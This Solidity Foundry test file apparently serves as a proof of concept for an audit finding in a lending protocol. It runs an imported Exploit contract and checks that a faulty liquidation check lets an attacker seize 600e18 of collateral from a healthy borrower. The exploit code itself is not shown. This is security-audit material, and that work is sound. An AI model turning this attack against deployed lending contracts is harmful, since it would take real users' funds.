// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, CrossChainRouter, LendStorage, LToken, MiniToken} from "./58391-lend-liquidation-validation-logic-is-wrong.sol";

// Lend V2 H-22 (finding 58391): _checkLiquidationValid passes payload.amount
// (the collateral seizeTokens) as the hypothetical borrowAmount, so a healthy
// borrower (1000e18 collateral vs 500e18 borrow) is flagged liquidatable and
// has 600e18 of collateral seized. The wrongly-seized collateral is minted to
// SINK 0x..D00d as the measurable harm magnitude.
contract Finding58391Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_healthyPositionWronglyLiquidated() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken sink = e.sink();
        emit log_named_uint("borrower collateral after", e.borrowerCollateralAfter());
        emit log_named_uint("attacker seized", e.attackerSeized());
        emit log_named_uint("harm at sink", sink.balanceOf(SINK));

        assertTrue(e.healthyByCorrectCheck(), "borrower is healthy under the correct check");
        assertTrue(e.liquidatedByBug(), "vulnerable check wrongly flagged the healthy position");
        assertEq(e.borrowerCollateralAfter(), 400e18, "healthy borrower lost 600e18 collateral");
        assertEq(e.attackerSeized(), 600e18, "attacker seized 600e18 of healthy collateral");
        assertEq(sink.balanceOf(SINK), 600e18, "harm magnitude measurable at sink");
    }
}
